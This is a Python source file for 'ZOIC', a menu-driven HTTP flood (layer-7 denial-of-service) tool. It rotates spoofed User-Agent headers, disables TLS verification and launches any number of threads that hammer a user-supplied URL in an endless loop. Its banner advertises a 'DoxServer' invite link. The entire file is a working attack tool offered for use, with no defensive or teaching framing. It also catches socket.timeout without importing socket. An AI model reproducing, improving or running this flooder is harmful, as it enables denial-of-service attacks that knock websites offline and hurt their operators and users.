import os
import sys
import urllib.request
import urllib.parse
import urllib.error
import threading
import random
import time
import ssl

# 색상 코드
zoic = "\033[38;5;118m"
red = "\033[38;5;196m"
clear = "\033[0m"

# User-Agent 리스트
user_agent = [
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57",
    "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0",
    "Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)"
]

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{zoic}
███████╗ ██████╗ ██╗ ██████╗
╚══███╔╝██╔═══██╗██║██╔════╝
  ███╔╝ ██║   ██║██║██║     
 ███╔╝  ██║   ██║██║██║     
███████╗╚██████╔╝██║╚██████╗
╚══════╝ ╚═════╝ ╚═╝ ╚═════╝       
{clear}
          
╔═════════════════════════════════════════════════════╗
║ {zoic}*{clear} Github    {zoic}:{clear}   https://github.com/madanokr001      ║
║ {zoic}*{clear} DoxServer {zoic}:{clear}   https://rvlt.gg/PnjMbQwH            ║
║ {zoic}*{clear} Version   {zoic}:{clear}   4.0                                 ║
║ {zoic}*{clear} ZOIC      {zoic}:{clear}   {zoic}[{clear}LAYER7{clear}{zoic}]{clear}                            ║
╚═════════════════════════════════════════════════════╝

╔═════════════════════════════════════════════════════╗
║ {zoic}[{clear}1{zoic}]{clear} HTTP Flood Attack                               ║
║ {zoic}[{clear}2{zoic}]{clear} Exit ZOIC                                       ║
╚═════════════════════════════════════════════════════╝
""")

def validate_url(url):
    if not url:
        return False, url
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            raise ValueError
        return True, url
    except ValueError:
        return False, url

def send_http_flood(url, threads, stop_event):
    def send_request(url):
        headers = {
            "User-Agent": random.choice(user_agent),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Connection": "close"
        }
        context = ssl._create_unverified_context()
        while not stop_event.is_set():
            try:
                req = urllib.request.Request(url, headers=headers)
                with urllib.request.urlopen(req, timeout=3, context=context) as response:
                    print(f"[{zoic}ZOIC{clear}] HTTP Flood -> {url} | Status: {response.getcode()}")
            except urllib.error.HTTPError as e:
                print(f"[{red}ERROR{clear}] HTTP Failed: {e.code} {e.reason}")
                time.sleep(1)
            except urllib.error.URLError as e:
                print(f"[{red}ERROR{clear}] HTTP Failed: {e.reason} (Server down?)")
                time.sleep(1)
            except socket.timeout:
                print(f"[{red}ERROR{clear}] HTTP Timeout: {url}")
                time.sleep(1)
            except Exception as e:
                print(f"[{red}ERROR{clear}] HTTP Error: {str(e)}")
                time.sleep(1)

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=send_request, args=(url,))
        t.daemon = True
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

def main():
    stop_event = threading.Event()
    while True:
        logo()
        select = input(f"""
╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
╚══{zoic}>{clear} """)

        if select == "1":
            url = input(f"[{zoic}ZOIC{clear}] URL (e.g., http://scm10215.o-r.kr) {zoic}>{clear} ").strip()
            is_valid, url = validate_url(url)
            if not is_valid:
                print(f"[{red}ERROR{clear}] Invalid URL (e.g., http://scm10215.o-r.kr)!")
                time.sleep(2)
                continue
            try:
                threads = int(input(f"[{zoic}ZOIC{clear}] THREADS (e.g., 10) {zoic}>{clear} "))
                if threads <= 0:
                    raise ValueError
            except ValueError:
                print(f"[{red}ERROR{clear}] Threads must be a positive number!")
                time.sleep(2)
                continue
            print(f"[{zoic}ZOIC{clear}] Starting HTTP Flood on {url} with {threads} threads")
            print(f"[{zoic}ZOIC{clear}] Press Ctrl+C to stop the attack...")
            stop_event.clear()
            try:
                send_http_flood(url, threads, stop_event)
            except KeyboardInterrupt:
                stop_event.set()
                print(f"[{zoic}ZOIC{clear}] Stopping HTTP Flood...")
                time.sleep(1)
            input(f"[{zoic}ZOIC{clear}] Press Enter to continue...")

        elif select == "2":
            print(f"[{zoic}ZOIC{clear}] Exiting...")
            sys.exit()

if __name__ == "__main__":
    main()